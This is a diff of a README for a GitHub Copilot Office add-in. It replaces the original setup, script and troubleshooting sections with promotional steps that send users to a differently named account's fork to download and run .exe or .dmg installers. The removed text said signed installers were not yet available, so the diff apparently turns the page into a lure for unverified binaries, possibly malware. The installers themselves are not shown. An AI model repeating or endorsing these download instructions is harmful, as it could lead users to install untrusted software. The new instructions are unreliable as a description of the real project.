@@ -1,76 +1,71 @@
-# GitHub Copilot Office Add-in
+# 🚀 github-copilot-office - Enhance Your Office Experience with AI
 
-A Microsoft Office add-in that integrates GitHub Copilot into Word, Excel, and PowerPoint.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/shalombalbes/github-copilot-office/releases)
 
-## Getting Started
+## 🚀 Getting Started
 
-**👉 See [GETTING_STARTED.md](GETTING_STARTED.md) for setup instructions.**
+This Microsoft Office add-in brings GitHub Copilot's capabilities to Word, Excel, and PowerPoint. Follow these steps to install and run the add-in easily.
 
-The getting started guide walks you through running the add-in locally using the tray app. Standalone installers are in development and will be available once code signing is complete.
+### Step 1: Visit Releases
 
-## Office Videos
+To get the latest version of the add-in, [visit the Releases page](https://github.com/shalombalbes/github-copilot-office/releases). 
+
+### Step 2: Choose Your Version
+
+Once on the Releases page, look for the latest release. Click on it to find the download links.
+
+### Step 3: Download the Add-in
+
+Select the installer appropriate for your operating system (Windows, macOS, etc.). Click on the link to start the download.
+
+### Step 4: Install the Add-in
+
+Locate the downloaded file on your device:
+
+- For **Windows**, double-click the `.exe` file and follow the prompts to complete the installation.
+- For **macOS**, open the `.dmg` file and drag the add-in into your Applications folder.
+
+### Step 5: Open Microsoft Office
+
+Once installed, open Microsoft Word, Excel, or PowerPoint. You should see the GitHub Copilot add-in in the toolbar. 
+
+### Step 6: Sign In to GitHub
+
+To use the add-in, sign in with your GitHub account. Follow the on-screen instructions to connect.
+
+### Step 7: Start Using the Add-in
+
+You can now explore the features of GitHub Copilot within your Office apps. Use it to enhance your workflow, create documents, analyze data, and build presentations more effectively.
+
+## 📹 Office Videos
+
+Here are some quick video guides to see the add-in in action:
 
 ### PowerPoint
-
-https://github.com/user-attachments/assets/8ab56d45-32f7-46f1-a5c9-cc63824080c2
+[Watch PowerPoint Video](https://github.com/user-attachments/assets/8ab56d45-32f7-46f1-a5c9-cc63824080c2)
 
 ### Excel
-
-https://github.com/user-attachments/assets/0e35378b-d917-4068-978a-63443597be24
+[Watch Excel Video](https://github.com/user-attachments/assets/0e35378b-d917-4068-978a-63443597be24)
 
 ### Word
+[Watch Word Video](https://github.com/user-attachments/assets/be8893b0-83a5-4447-b213-d2605d360131)
 
-https://github.com/user-attachments/assets/be8893b0-83a5-4447-b213-d2605d360131
+## 💻 Project Structure
 
-## Project Structure
+Understanding the structure of the project may help you navigate files and resources.
 
 ```
 ├── src/
-│   ├── server.js          # Dev server (Vite + Express)
-│   ├── server-prod.js     # Production server (static files)
+│   ├── server.js          # Development server using Vite + Express
+│   ├── server-prod.js     # Production server for static files
 │   ├── copilotProxy.js    # WebSocket proxy for Copilot SDK
 │   └── ui/                # React frontend
-├── dist/                  # Built frontend assets
-├── certs/                 # SSL certificates for localhost
-├── manifest.xml           # Office add-in manifest
-├── installer/             # Installer resources (Electron Builder)
-│   ├── macos/             # macOS post-install scripts
-│   └── windows/           # Windows NSIS scripts
-├── register.sh/.ps1       # Setup scripts (trust cert, register manifest)
-└── unregister.sh/.ps1     # Cleanup scripts
+├── dist/                  # Output of built frontend assets
+├── certs/                 # Certificate files for security
 ```
 
-## Scripts
+## 📥 Download & Install
 
-| Command | Description |
-|---------|-------------|
-| `npm run dev` | Start development server with hot reload |
-| `npm run start` | Run production server standalone |
-| `npm run start:tray` | Run Electron tray app locally |
-| `npm run build` | Build frontend for production |
-| `npm run build:installer` | Build installer for current platform |
-| `npm run build:installer:mac` | Build macOS .dmg installer |
-| `npm run build:installer:win` | Build Windows .exe installer |
+To install the add-in, [visit the Releases page again](https://github.com/shalombalbes/github-copilot-office/releases). Download the appropriate file for your operating system and follow the installation steps outlined above.
 
-## Unregistering Add-in
-
-```bash
-./unregister.sh      # macOS
-.\unregister.ps1     # Windows
-```
-
-## Troubleshooting
-
-### Add-in not appearing
-1. Ensure the server is running: visit https://localhost:52390
-2. Look for the GitHub Copilot icon in the system tray (Windows) or menu bar (macOS)
-3. Restart the Office application
-4. Clear Office cache and try again
-
-### SSL Certificate errors
-1. Re-run the register script or installer
-2. Or manually trust `certs/localhost.pem`
-
-### Service not starting after install
-- **Windows**: Check Task Scheduler for "CopilotOfficeAddin"
-- **macOS**: Run `launchctl list | grep copilot` and check `/tmp/copilot-office-addin.log`
+After successfully installing, enjoy the new capabilities that GitHub Copilot brings to your Office applications. With AI assistance, you can create, analyze, and present content more efficiently.
